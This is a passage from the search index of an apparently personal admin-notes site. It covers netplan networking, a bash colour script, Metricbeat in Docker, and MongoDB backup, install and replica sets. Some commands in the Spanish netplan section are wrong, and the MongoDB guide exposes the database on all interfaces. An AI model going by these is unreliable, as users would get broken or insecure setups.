wlx18d6c7116805: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</code></p> <p>In this example, my adapter is <code>wlx18d6c7116805</code>.</p>"},{"location":"Linux/staticNetworkip/#2-compose-the-netplan-file","title":"2. Compose the Netplan file","text":"<ol> <li> <p>Create a netplan yaml file in the /etc/netplan directory.</p> </li> <li> <p>In this example my file is called <code>mynet1.yaml</code>.</p> </li> <li>Configure the wireless adapter details under <code>wifis</code>.</li> <li>The SSID for your wireless network (the name of the network) is configured under <code>access-points</code>.</li> <li>Record the wireless network password under the SSID.</li> <li>Make sure to configure any other networking adapters that you require as well, see my previous blog for examples of wired networks here.</li> </ol> <p>Example</p> <pre><code>network:\n  ethernets:\n    eno1:\n      addresses:\n        - 10.150.15.25/24\n  wifis:\n    wlx18d6c7116805:\n      dhcp4: yes\n      dhcp6: yes\n      access-points:\n        \"IDontLikeSand15\":\n          password: \"Supersecure123\"\n  version: 2\n  renderer: NetworkManager\n</code></pre> <p>Example notes</p> <ul> <li>The wired ethernet adapter <code>eno1</code> is configured with a static IPv4 address.</li> <li>The wireless adapter <code>wlx18d6c7116805</code> is configured for DHCPv4 and DHCPv6 address allocation.</li> <li>The SSID is <code>IDontLikeSand15</code> with a password of <code>Supersecure123</code>.</li> </ul>"},{"location":"Linux/staticNetworkip/#3-apply-the-netplan-file","title":"3. Apply the Netplan file","text":"<p>Run the command <code>netplan apply &lt;your-netplan-file-name&gt;</code>.</p>"},{"location":"Linux/staticNetworkip/#4-verify","title":"4. Verify","text":"<ul> <li>Use the command <code>iwconfig</code> to check the wireless adapter state.</li> <li>Use <code>ip add</code> to view all your network adapter.</li> </ul> <pre><code>$ iwconfig\nlo        no wireless extensions.\n\neno1      no wireless extensions.\n\nwlx18d6c7116805  IEEE 802.11bgn  ESSID:\"IDontLikeSand15\"  Nickname:\"&lt;WIFI@REALTEK&gt;\"\n          Mode:Managed  Frequency:2.412 GHz  Access Point: 24:F2:7F:D1:89:81\n          Bit Rate:72.2 Mb/s   Sensitivity:0/0\n          Retry:off   RTS thr:off   Fragment thr:off\n          Power Management:off\n          Link Quality=100/100  Signal level=100/100  Noise level=0/100\n          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0\n          Tx excessive retries:0  Invalid misc:0   Missed beacon:0\n\n$ ip add\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eno1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether 50:65:f3:2f:c9:a1 brd ff:ff:ff:ff:ff:ff\n    altname enp0s25\n    inet 10.150.15.25/24 brd 10.150.15.255 scope global noprefixroute eno1\n       valid_lft forever preferred_lft forever\n    inet6 2001:db8:15:0:5265:f3ff:fe2f:c9a1/64 scope global dynamic mngtmpaddr\n       valid_lft 2591913sec preferred_lft 604713sec\n    inet6 fe80::5265:f3ff:fe2f:c9a1/64 scope link noprefixroute\n       valid_lft forever preferred_lft forever\n3: wlx18d6c7116805: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 18:d6:c7:11:68:05 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.15.74/24 brd 192.168.15.255 scope link noprefixroute wlx18d6c7116805\n       valid_lft forever preferred_lft forever\n    inet6 2001:db8:15:0:a402:f49a:d7be:5049/64 scope global temporary dynamic\n       valid_lft 599939sec preferred_lft 81131sec\n    inet6 2001:db8:15:0:1ad6:c7ff:fe11:6805/64 scope global dynamic mngtmpaddr noprefixroute\n       valid_lft 2591914sec preferred_lft 604714sec\n    inet6 fe80::1ad6:c7ff:fe11:6805/64 scope link noprefixroute\n       valid_lft forever preferred_lft forever\n</code></pre>"},{"location":"Linux/staticNetworkip/#part-2","title":"Part 2","text":"<p>Nota: Quedan advertidos.</p> <p>Ahora probemos como se ver\u00eda con una direcci\u00f3n WAN:</p> <p></p> <p>Ahora un ejemplo para una LAN:</p> <p></p> <p>Nota: Para a\u00f1adir rutas debemos a\u00f1adir al final del archivo.</p> <pre><code>routes:\n  - to: 192.168.44.0/24\n    via: 192.168.0.1\n</code></pre> <p>Ahora, un ejemplo completo con m\u00faltiples rutas:</p> <pre><code>network:\n  version: 2\n  renderer: networkd\n  ethernets:\n    ens3:\n      dhcp4: yes\n    eno2:\n      dhcp4: no\n      dhcp6: no\n      addresses: [10.10.0.11/24]\n      gateway4: 10.10.0.1\n      routes:\n        - to: 192.168.1.0/24\n          via: 10.10.0.1        \n        - to: 192.168.10.0/24\n          via: 10.10.0.1 \n</code></pre> <p>Probando la configuraci\u00f3n</p> <p>Antes de aplicar cualquier cambio, probaremos el archivo de configuraci\u00f3n. Ejecute el siguiente comando:</p> <pre><code>sudo netplan try\n</code></pre> <p>Si usted ve el mensaje:</p> <pre><code>Configuration accepted\n</code></pre> <p>Entonces puede proseguir a aplicar la configuraci\u00f3n. Lo cual se lleva a cabo con:</p> <pre><code>sudo netplan apply\n</code></pre> <p>En caso de error, podemos debuguear los posibles errores con:</p> <pre><code>sudo netplan apply\n</code></pre> <p>Reiniciando los servicios de red</p> <p>Una vez que todas las configuraciones se hayan aplicado correctamente, reinicie el servicio Network-Manager[Ubuntu Desktop] ejecutando el siguiente comando:</p> <pre><code>sudo netplan --d apply\n</code></pre> <p>Si est\u00e1 utilizando Ubuntu Server, utilice el siguiente comando:</p> <pre><code>sudo systemctl restart network-manager\n</code></pre> <p>O puede reiniciar de la manera tradicional:</p> <pre><code>sudo systemctl restart system-networkd\n</code></pre> <p>Verificar la direcci\u00f3n IP</p> <p>Ahora, para verificar si las nuevas configuraciones se aplican correctamente, ejecute el siguiente comando para verificar la direcci\u00f3n IP:</p> <pre><code>ip -a\n</code></pre> <p>Con esto creo que es suficiente. Si este post no ha sido lo suficiente explicativo[y me disculpo por ello, a veces yo mismo me enredo intentando explicar cosas T.T], ac\u00e1 en la p\u00e1gina de Netplan hay bastantes ejemplos que har\u00e1n m\u00e1s ameno su entendimiento.</p>"},{"location":"Linux/terminalColors/","title":"terminalColors","text":"<pre><code>#!/bin/bash\n# Definimos colores, primer plano\nPNegro='\\033[30m'\nPRojo='\\033[31m'\nPVerde='\\033[32m'\nPNaranja='\\033[33m'\nPAzul='\\033[34m'\nPMagenta='\\033[35m'\nPCian='\\033[36m'\nPGris='\\033[37m'\nNC='\\033[39m'\n# Colores de fondo, video inverso o segundo plano\nIGris='\\033[100m'       # Gris oscuro\nIRojo='\\033[101m'       # Luz roja\nIVerde='\\033[102m'      # Verde claro\nIAmarillo='\\033[103m'       # Amarillo\nIAzul='\\033[104m'       # Azul claro\nIMagenta='\\033[105m'        # Morado claro\nICian='\\033[106m'       # Verde azulado\nIBlanco='\\033[107m'     # Blanco\nINC='\\033[40m'\n# -----------\nprintf \"${PRojo}${IAmarillo}\"\necho \"Hola Caracola\"\nprintf \"${PNegro}${IVerde}\"\necho \"Cada Texto\"\nprintf \"${PAzul}${ICian}\"\necho \"En un color\"\nprintf \"${NC}${INC}\"\necho \"Y vuelta a la normalidad\"\n</code></pre>"},{"location":"Metricbeats/Metricbeats/","title":"Metricbeats in docker","text":"<pre><code># docker-compose.yml this docker-compose needs be executed by sudo.\n\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\u2191\n#############################-Rest of the code-#########################\n# Metricbeats\n  metricbeat:\n    container_name: metricbeats_docker\n    #image: eeacms/metricbeat\n    image:  docker.elastic.co/beats/metricbeat:7.16.1\n    # https://github.com/docker/swarmkit/issues/1951\n    hostname: \"MC0-metricbeat\"  # \u2190 This name will appear in kibana to diferenciate other hosts\n    user: root\n    #network_mode: \"host\"\n    #configs:\n    #  - source: mb_config\n    #    target: /usr/share/metricbeat/metricbeat.yml\n    volumes:\n      - ./config/metricbeat.yml:/usr/share/metricbeat/metricbeat.yml\n      - /proc:/hostfs/proc:ro\n      - /sys/fs/cgroup:/hostfs/sys/fs/cgroup:ro\n      - /:/hostfs:ro\n      - /var/run/docker.sock:/var/run/docker.sock\n      - metricbeat:/usr/share/metricbeat/data\n    env_file:\n      - .env_elastic\n    command: [\"--strict.perms=false\", \"-system.hostfs=/hostfs\", \"-e\"]\n    deploy:\n      mode: global\n#############################-Rest of the code-#########################      \n\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\u2193\n</code></pre>"},{"location":"Metricbeats/Metricbeats/#config-file","title":"Config File","text":"<pre><code>#./config/metricbeat.yml\nmetricbeat.config.modules:\n  path: ${path.config}/modules.d/*.yml\n  reload.enabled: false\n#============================== System =========================================\nmetricbeat.modules:\n- module: system\n  period: 10s\n  metricsets:\n    - cpu\n    - load\n    - memory\n    - network\n    - process\n    - process_summary\n    - core\n    - diskio\n    - socket\n  process.include_top_n:\n    by_cpu: 5\n    by_memory: 5\n  enabled: true\n#============================== Docker =========================================\n- module: docker\n  hosts: [\"unix:///var/run/docker.sock\"]\n  period: 10s\n  enabled: true\n  metricsets:\n    - container\n    - cpu\n    - diskio\n    - healthcheck\n    - info\n    - memory\n    - network\n\nprocessors:\n- add_cloud_metadata: ~\n- add_host_metadata:\n    netinfo.enabled: true\n- add_docker_metadata:\n    host: \"unix:///var/run/docker.sock\"\n#============================== Elastic =========================================\noutput.elasticsearch:\n  hosts: [\"${ELASTICSEARCH_HOST}\"]\n  username: ${ELASTICSEARCH_USERNAME}\n  password: ${ELASTICSEARCH_PASSWORD}\n\n#============================== Kibana =========================================\nsetup.kibana:\n  host: \"${KIBANA_URL}\"\n  username: ${ELASTICSEARCH_USERNAME}\n  password: ${ELASTICSEARCH_PASSWORD}\n</code></pre>"},{"location":"MongoDB/BackupMongo/","title":"Mongo backup and restore","text":"<p>You can also use <code>gzip</code> for taking backup of one collection and compressing the backup on the fly:</p> <pre><code>mongodump --db somedb --collection somecollection --out - | gzip &gt; collectiondump.gz\n</code></pre> <p>or with a date in the file name:</p> <pre><code>mongodump --db somedb --collection somecollection --out - | gzip &gt; dump_`date \"+%Y-%m-%d\"`.gz\n</code></pre> <p>Update: Backup all collections of a database in a date folder. The files are gziped:</p> <pre><code>mongodump --db somedb --gzip --out /backups/`date +\"%Y-%m-%d\"`\n</code></pre> <p>Or for a single archive:</p> <pre><code>mongodump --db somedb --gzip --archive &gt; dump_`date \"+%Y-%m-%d\"`.gz\n</code></pre> <p>Or when mongodb is running inside docker:</p> <pre><code>docker exec &lt;CONTAINER&gt; sh -c 'exec mongodump --db somedb --gzip --archive' &gt; dump_`date \"+%Y-%m-%d\"`.gz\n</code></pre> <p>Backup/Restore Mongodb with timing.</p> <p>Backup:</p> <pre><code>sudo mongodump --db db_name --out /path_of_your_backup/`date +\"%m-%d-%y\"`\n</code></pre> <p><code>--db</code> argument for databse name</p> <p><code>--out</code> argument for path of output</p> <p>Restore:</p> <pre><code>sudo mongorestore --db db_name --drop /path_of_your_backup/01-01-19/db_name/\n</code></pre> <p><code>--drop</code> argument for drop databse before restore</p> <p>Timing:</p> <p>You can use crontab for timing backup:</p> <pre><code>sudo crontab -e\n</code></pre> <p>It opens with editor(e.g. nano)</p> <pre><code>3 3 * * * mongodump --out /path_of_your_backup/`date +\"%m-%d-%y\"`\n</code></pre> <p>Mongo dump and restore with uri to local</p> <pre><code>mongodump --uri \"mongodb://USERNAME:PASSWORD@IP_OR_URL:PORT/DB_NAME\" --collection COLLECTION_NAME -o LOCAL_URL\n</code></pre> <p>Omitting --collection COLLECTION_NAME will dump entire DB.</p> <p>If your database is in the local system. Then you can type the below command. for Linux terminal</p> <pre><code>mongodump -h SERVER_NAME:PORT -d DATABASE_NAME\n</code></pre> <p>If database has username and password then you can use below code.</p> <pre><code>mongodump -h SERVER_NAME:PORT -d DATABASE_NAME -u DATABASE_USER -p PASSWORD\n</code></pre> <p>This worked very well in my Linux terminal.</p> <p>Dump command:</p> <pre><code>mongodump --host localhost:27017 --gzip --db Alex --out ./testSO\n</code></pre> <p>Restore Command:</p> <pre><code>mongorestore --host localhost:27017 --gzip --db Alex ./testSO/Alex\n</code></pre> <p>Works perfectly!</p>"},{"location":"MongoDB/BackupMongo/#while-using-archive","title":"While using archive:","text":"<p>Dump command:</p> <pre><code>mongodump --host localhost:27017 --archive=dump.gz --gzip --db Alex\n</code></pre> <p>Restore Command:</p> <pre><code>mongorestore --host localhost:27017 --gzip --archive=dump.gz --db Alex\n</code></pre> <p>Note:- While using archive you need to stick with the <code>database name</code></p>"},{"location":"MongoDB/dropDatabase/","title":"Drop databases Mongo","text":""},{"location":"MongoDB/dropDatabase/#example-drop-mongodb-database","title":"Example \u2013 Drop MongoDB Database","text":"<p>Following is an example where we shall try deleting database named tutorialkart.</p> <p>Refer MongoDB Create Database, if you have not already created one.</p> <p>Open Mongo Shell and follow the commands in sequence.</p> <pre><code>&gt; show dbs``admin     0.000GB``local     0.000GB``tutorialkart 0.000GB``&gt; use tutorialkart``switched to db tutorialkart``&gt; db.dropDatabase()``{ \"dropped\" : \"tutorialkart\", \"ok\" : 1 }``&gt; show dbs``admin 0.000GB``local 0.000GB``&gt;\n</code></pre> <p>Following is the explanation for each mongodb command we executed above</p> <ol> <li>show dbs there are three databases. We shall delete tutorialkart database in this demonstration.</li> <li>use tutorialkart switched to tutorialkart database.</li> <li><code>db.dropDatabase()</code> drops the database that is currently in use i.e., tutorialkart database.</li> <li>show dbs now there are only two databases, because tutorialkart database is no more present.</li> </ol>"},{"location":"MongoDB/installMongo/","title":"Instalar Mongo en Ubuntu 22.04","text":""},{"location":"MongoDB/installMongo/#install-mongodb-60-on-ubuntu-220420041804","title":"Install  MongoDB 6.0 on Ubuntu 22.04|20.04|18.04","text":"<p>The following steps will guide to accomplish the installation of MongoDB 6.0 on Ubuntu 20.04|18.04.</p>"},{"location":"MongoDB/installMongo/#mongobd-community-enterprise-editions","title":"MongoBD Community &amp; Enterprise Editions","text":"<p>Both the free Community edition and the Enterprise edition of MongoDB are available as a part of the Mongo Enterprise Advanced subscription. On-disk encryption, LDAP and Kerberos support, auditing, and other features have been introduced to the Enterprise edition.</p>"},{"location":"MongoDB/installMongo/#step-1-perform-system-update","title":"Step 1: Perform System Update","text":"<p>Before we can proceed with our installation, let\u2019s update Ubuntu 20.04|18.04 system and install the required packages:</p> <pre><code>sudo apt update\nsudo apt install wget curl gnupg2 software-properties-common apt-transport-https ca-certificates lsb-release\n</code></pre>"},{"location":"MongoDB/installMongo/#step-2-import-the-public-key","title":"Step 2: Import the public key","text":"<p>Run the following command to import the MongoDB public GPG Key:</p> <pre><code>curl -fsSL https://www.mongodb.org/static/pgp/server-6.0.asc|sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/mongodb-6.gpg\n</code></pre>"},{"location":"MongoDB/installMongo/#step-3-configure-mongodb-repo","title":"Step 3: Configure MongoDB Repo","text":"<p>Using the following commands, add the repository to your system right away:</p> <p>Ubuntu 22.04:</p> <pre><code>echo \"deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb-org-6.0.list\n</code></pre> <p>Ubuntu 20.04</p> <pre><code>echo \"deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu focal/mongodb-org/6.0 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb-org-6.0.list\n</code></pre> <p>Ubuntu 18.04</p> <pre><code>echo \"deb [ arch=amd64,arm64 ] https://repo.mongodb.org/apt/ubuntu bionic/mongodb-org/6.0 multiverse\" | sudo tee /etc/apt/sources.list.d/mongodb-org-6.0.list\n</code></pre>"},{"location":"MongoDB/installMongo/#step-4-install-mongodb-60-on-ubuntu-220420041804","title":"Step 4: Install MongoDB 6.0 on Ubuntu 22.04|20.04|18.04","text":"<p>Once the appropriate repository has been added, use the following command to install MongoDB 6.0 on Ubuntu.</p> <p>***Ubuntu 22.04:***</p> <pre><code>wget http://archive.ubuntu.com/ubuntu/pool/main/o/openssl/libssl1.1_1.1.1f-1ubuntu2.16_amd64.deb\nsudo dpkg -i ./libssl1.1_1.1.1f-1ubuntu2.16_amd64.deb\nsudo apt update\nsudo apt install mongodb-org\n</code></pre> <p>***Ubuntu 20.04 / 18.04***:</p> <pre><code>sudo apt update\nsudo apt install mongodb-org\n</code></pre> <p>Dependency tree:</p> <pre><code>Reading package lists... Done\nBuilding dependency tree       \nReading state information... Done\nThe following package was automatically installed and is no longer required:\n  libfwupdplugin1\nUse 'sudo apt autoremove' to remove it.\nThe following additional packages will be installed:\n  mongodb-database-tools mongodb-mongosh mongodb-org-database mongodb-org-database-tools-extra mongodb-org-mongos mongodb-org-server mongodb-org-shell mongodb-org-tools\nThe following NEW packages will be installed:\n  mongodb-database-tools mongodb-mongosh mongodb-org mongodb-org-database mongodb-org-database-tools-extra mongodb-org-mongos mongodb-org-server mongodb-org-shell mongodb-org-tools\n0 upgraded, 9 newly installed, 0 to remove and 4 not upgraded.\nNeed to get 134 MB of archives.\nAfter this operation, 458 MB of additional disk space will be used.\nDo you want to continue? [Y/n] y\n</code></pre> <p>After successful installation, start and enable MongoDB:</p> <pre><code>sudo systemctl enable --now mongod\n</code></pre> <p>Check MongoDB Status:</p> <pre><code>$ systemctl status mongod\n\u25cf mongod.service - MongoDB Database Server\n     Loaded: loaded (/lib/systemd/system/mongod.service; enabled; vendor preset: enabled)\n     Active: active (running) since Fri 2022-07-29 04:11:46 EAT; 8s ago\n       Docs: https://docs.mongodb.org/manual\n   Main PID: 430451 (mongod)\n     Memory: 61.6M\n     CGroup: /system.slice/mongod.service\n             \u2514\u2500430451 /usr/bin/mongod --config /etc/mongod.conf\n\nJul 29 04:11:46 frank-PC systemd[1]: Started MongoDB Database Server.\n</code></pre> <p>Check MongoDB installed version:</p> <pre><code>$ mongod --version\ndb version v6.0.0\nBuild Info: {\n    \"version\": \"6.0.0\",\n    \"gitVersion\": \"e61bf27c2f6a83fed36e5a13c008a32d563babe2\",\n    \"openSSLVersion\": \"OpenSSL 1.1.1f  31 Mar 2020\",\n    \"modules\": [],\n    \"allocator\": \"tcmalloc\",\n    \"environment\": {\n        \"distmod\": \"ubuntu2004\",\n        \"distarch\": \"x86_64\",\n        \"target_arch\": \"x86_64\"\n    }\n}\n</code></pre>"},{"location":"MongoDB/installMongo/#step-5-configure-mongodb-60","title":"Step 5: Configure MongoDB 6.0","text":"<p>The configuration file for MongoDB is located at <code>/etc/mongod.conf</code>. All the needed configurations, including the database path, logs directory, etc., can be made in this file. Some of the MongoDB setups are listed below.</p>"},{"location":"MongoDB/installMongo/#enable-password-authentication-on-mongodb-60","title":"Enable Password Authentication on MongoDB 6.0","text":"<p>Users must enter a password in order to log in and read and edit databases when this is enabled.</p> <p>To do this, uncomment the following line:</p> <pre><code>security:\n  authorization: enabled\n</code></pre>"},{"location":"MongoDB/installMongo/#enable-remote-access-on-mongodb-60","title":"Enable Remote Access on MongoDB 6.0","text":"<p>MongoDB is typically configured to only allow local access. You must modify the code below to include the server IP or hostname as preferred if you want to access it remotely.</p> <pre><code># network interfaces\nnet:\n  port: 27017\n  bindIp: 127.0.0.1  # Enter 0.0.0.0,:: to bind to all IPv4 and IPv6 addresses or, alternatively, use the net.bindIpAll setting.\n</code></pre> <p>To bind to all IPv4 and IPv6 address you\u2019ll set:</p> <pre><code> bindIp: 0.0.0.0\n</code></pre> <p>Save the file after making the required changes, then restart the service:</p> <pre><code>sudo systemctl restart mongod\n</code></pre> <p>Allowing the port past the firewall will allow remote access to the service:</p> <pre><code>sudo ufw allow 27017\n</code></pre>"},{"location":"MongoDB/installMongo/#step-6-change-mongodb-60-default-data-path","title":"Step 6: Change MongoDB 6.0 default Data Path","text":"<p>The path to MongoDB\u2019s data storage is /var/lib/mongodb by default. However, if another path is selected, this can be adjusted. Stop the currently operating instance to achieve this:</p> <pre><code>sudo systemctl stop mongod.service\n</code></pre> <p>Create the needed path and give it the appropriate rights to store data:</p> <pre><code>sudo mkdir -p /newdata/mongo\nsudo chown -R mongodb:mongodb  /newdata/mongo\n</code></pre> <p>The former path\u2019s contents should be copied to the new directory:</p> <pre><code>sudo rsync -av /var/lib/mongodb  /newdata/mongo\n</code></pre> <p>Then rename the old directory to a backup file:</p> <pre><code>sudo mv /var/lib/mongodb /var/lib/mongodb.bak\n</code></pre> <p>Now, create a symbolic link to the new directory:</p> <pre><code>sudo ln -s /newdata/mongo /var/lib/mongodb\n</code></pre> <p>Restart MongoDB Service:</p> <pre><code>sudo systemctl daemon-reload\nsudo systemctl start mongod\n</code></pre>"},{"location":"MongoDB/installMongo/#step-7-using-mongodb-60-database","title":"Step 7: Using MongoDB 6.0 Database","text":"<p>You can use the following command to reach the MongoDB shell:</p> <pre><code>$ mongosh\n</code></pre> <p>Here is the output:</p> <pre><code>Current Mongosh Log ID: 62e33c2dfed670cec73bbf7f\nConnecting to:      mongodb://127.0.0.1:27017/?directConnection=true&amp;serverSelectionTimeoutMS=2000&amp;appName=mongosh+1.5.3\nUsing MongoDB:      6.0.0\nUsing Mongosh:      1.5.3\n\nFor mongosh info see: https://docs.mongodb.com/mongodb-shell/\n\n\nTo help improve our products, anonymous usage data is collected and sent to MongoDB periodically (https://www.mongodb.com/legal/privacy-policy).\nYou can opt-out by running the disableTelemetry() command.\n\nWarning: Found ~/.mongorc.js, but not ~/.mongoshrc.js. ~/.mongorc.js will not be loaded.\n  You may want to copy or rename ~/.mongorc.js to ~/.mongoshrc.js.\ntest&gt; \n</code></pre>"},{"location":"MongoDB/installMongo/#create-a-user-and-add-a-role-in-mongodb","title":"Create a User and Add a Role in MongoDB","text":"<p>We\u2019ll make a user named ***mongdbuser*** and give them the admin roles for the purposes of this guide. The desired user can, however, be created with this command.</p> <pre><code>use admin\ndb.createUser(\n{\nuser: \"mongdbuser\",\npwd: passwordPrompt(), // or cleartext password\nroles: [ { role: \"userAdminAnyDatabase\", db: \"admin\" }, \"readWriteAnyDatabase\" ]\n}\n)\n</code></pre> <p>Give the user the proper password, then use the command listed below to close the shell.</p> <pre><code>&gt; exit\nbye\n</code></pre> <p>Log in to the shell with the user credentials to see if the user has been created.</p> <pre><code>$ mongosh -u mongdbuser -p --authenticationDatabase admin\n</code></pre>"},{"location":"MongoDB/installMongo/#create-a-database-in-mongodb","title":"Create a database in MongoDB","text":"<p>You can check the available databases:</p> <pre><code>&gt; show dbs\nadmin   132.00 KiB\nconfig   12.00 KiB\nlocal    72.00 KiB\n</code></pre> <p>It\u2019s simple to create a database with MongoDB; all you have to do is switch to a blank database. ***mymongodb***, for instance:</p> <pre><code>&gt; use mongotestdb\n</code></pre>"},{"location":"MongoDB/installMongo/#create-a-collection-in-mongodb","title":"Create a collection in MongoDB","text":"<p>In SQL databases, a collection is comparable to a table. Here, a table can be created in the appropriate database using the commands listed below:</p> <pre><code>db.employeedetails.insertOne(\n   {F_Name: \"John\",\n    L_NAME: \"Doe\",\n    ID_NO: \"23245\",\n     AGE: \"25\",\n     TEL: \"63365467666\"\n   }\n)\n</code></pre> <p>Once created, use the following command to view the collections:</p> <pre><code>&gt; show collections\nemployeedetails\n</code></pre>"},{"location":"MongoDB/installMongo/#conclusion","title":"Conclusion","text":"<p>Our tutorial on how to install MongoDB 6.0 on Ubuntu 20.04|18.04 has come to a conclusion. We have also learned how to create databases, collections, and users. We sincerely hope you found this information helpful.</p>"},{"location":"MongoDB/mongoDBinstruction/","title":"mongoDBinstruction","text":""},{"location":"MongoDB/mongoDBinstruction/#using-docker-to-deploy-a-mongodb-clusterreplica-set","title":"Using Docker to Deploy a MongoDB Cluster/Replica Set","text":"<p>MongoDB is a general-purpose database that was built with the web in mind. Amongst other things, it offers high availability when used in clusters, also called replica sets. A replica set is a group of MongoDB servers, called nodes, containing an identical copy of the data. If one of the servers fails, the other two will pick up the load while the crashed one restarts.</p> <p></p> <p>When you create a MongoDB instance on MongoDB Atlas, the database-as-a-service offering by MongoDB, a cluster is automatically created for you, ensuring that you have the best possible experience.</p> <p>However, if you need to experiment with MongoDB clusters, you can use Docker to create a cluster on your personal computer. This tutorial will provide you with the necessary instructions to create your own MongoDB Docker cluster.</p>"},{"location":"MongoDB/mongoDBinstruction/#benefits-of-docker-deployment","title":"Benefits of Docker Deployment","text":"<p>There are many different ways to create a MongoDB cluster. The easiest way is by using MongoDB Atlas, the database-as-a-service offering by MongoDB. With just a few clicks, you can create your free cluster, hosted in the cloud.</p> <p>If you want to experiment with clusters to understand better how they work, or if you need a development environment with a cluster, you can install MongoDB on your computer and deploy a replica set.</p> <p>If you do not want to install MongoDB on your laptop, you can use Docker to run your cluster. Docker is an application to launch containers, packages that contain applications along with all the required dependencies necessary to run them.</p> <p>Using Docker is an alternative way to get started with replica sets without a local installation of MongoDB. It is a convenient way to ensure that everyone on your team runs the same cluster configuration.</p> <p>The same technique would be used to deploy a highly available cluster on Kubernetes.</p>"},{"location":"MongoDB/mongoDBinstruction/#instructions","title":"Instructions","text":"<p>The steps to create a docker cluster are as follows.</p> <ol> <li>Create a Docker network.</li> <li>Start three instances of MongoDB.</li> <li>Initiate the Replica Set.</li> </ol> <p>Once you have a MongoDB cluster up and running, you will be able to experiment with it.</p>"},{"location":"MongoDB/mongoDBinstruction/#prerequisites","title":"Prerequisites","text":"<p>For this tutorial, you will need to have a runtime for containers. You can find the installation instructions for your operating system on the Docker official website.</p>"},{"location":"MongoDB/mongoDBinstruction/#create-a-docker-network","title":"Create a Docker Network","text":"<p>The first step is to create a Docker network. This network will let each of your containers running in this network see each other. To create a network, run the <code>docker network create</code> command.</p> <pre><code>docker network create mongoCluster\n</code></pre> <p>The <code>mongoCluster</code> parameter here is the network\u2019s name; you can pick one that is appropriate for your setup.</p> <p>After executing the command, you should see the id of the network you just created.</p> <p>Note that this command only needs to run once. If you restart your containers afterwards, you won\u2019t need to recreate this network.</p>"},{"location":"MongoDB/mongoDBinstruction/#start-mongodb-instances","title":"Start MongoDB Instances","text":"<p>You are now ready to start your first container with MongoDB. To start the container, use the <code>docker run</code> command.</p> <pre><code>docker run -d --rm -p 27017:27017 --name mongo1 --network mongoCluster mongo:5 mongod --replSet myReplicaSet --bind_ip localhost,mongo1\n</code></pre> <p>In here, you tell docker to start a container with the following parameters:</p> <ul> <li><code>-d</code> indicates that this container should run in detached mode (in the background).</li> <li><code>-p</code> indicates the port mapping. Any incoming request on port 27017 on your machine will be redirected to port 27017 in the container.</li> <li><code>--name</code> indicates the name of the container. This will become the hostname of this machine.</li> <li><code>--network</code> indicates which Docker network to use. All containers in the same network can see each other.</li> <li><code>mongo:5</code> is the image that will be used by Docker. This image is the MongoDB Community server version 5 (maintained by Docker). You could also use a MongoDB Enterprise custom image.</li> </ul> <p>The rest of this instruction is the command that will be executed once the container is started. This command creates a new <code>mongod</code> instance ready for a replica set.</p> <p>If the command was successfully executed, you should see a long hexadecimal string representing the container id. Start two other containers. You will need to use a different name and a different port for those two.</p> <pre><code>docker run -d --rm -p 27018:27017 --name mongo2 --network mongoCluster mongo:5 mongod --replSet myReplicaSet --bind_ip localhost,mongo2\n\ndocker run -d --rm -p 27019:27017 --name mongo3 --network mongoCluster mongo:5 mongod --replSet myReplicaSet --bind_ip localhost,mongo3\n</code></pre> <p>You now have three containers running MongoDB. You can use <code>docker ps</code> to validate that they are running.</p> <p></p>"},{"location":"MongoDB/mongoDBinstruction/#initiate-the-replica-set","title":"Initiate the Replica Set","text":"<p>The next step is to create the actual replica set with the three members. To do so, you will need to use the MongoDB Shell. This CLI (command-line interface) tool is available with the default MongoDB installation or installed independently. However, if you don\u2019t have the tool installed on your laptop, it is possible to use <code>mongosh</code> available inside containers with the <code>docker exec</code> command.</p> <pre><code>docker exec -it mongo1 mongosh --eval \"rs.initiate({\n _id: \\\"myReplicaSet\\\",\n members: [\n   {_id: 0, host: \\\"mongo1\\\"},\n   {_id: 1, host: \\\"mongo2\\\"},\n   {_id: 2, host: \\\"mongo3\\\"}\n ]\n})\"\n</code></pre> <p>This command tells Docker to run the <code>mongosh</code> tool inside the container named <code>mongo1</code>. <code>mongosh</code> will then try to evaluate the <code>rs.initiate()</code> command to initiate the replica set.</p> <p>As part of the configuration object that is passed to <code>rs.initiate()</code>, you will need to specify the name of the replica set (<code>myReplicaSet</code>, in this case), along with the list of <code>members</code> that will be part of the replica set. The hostnames for the containers are the names of the containers as specified by the <code>--name</code> parameter in the <code>docker run</code> command. You can learn more about the possible options for configuring a replica set from the 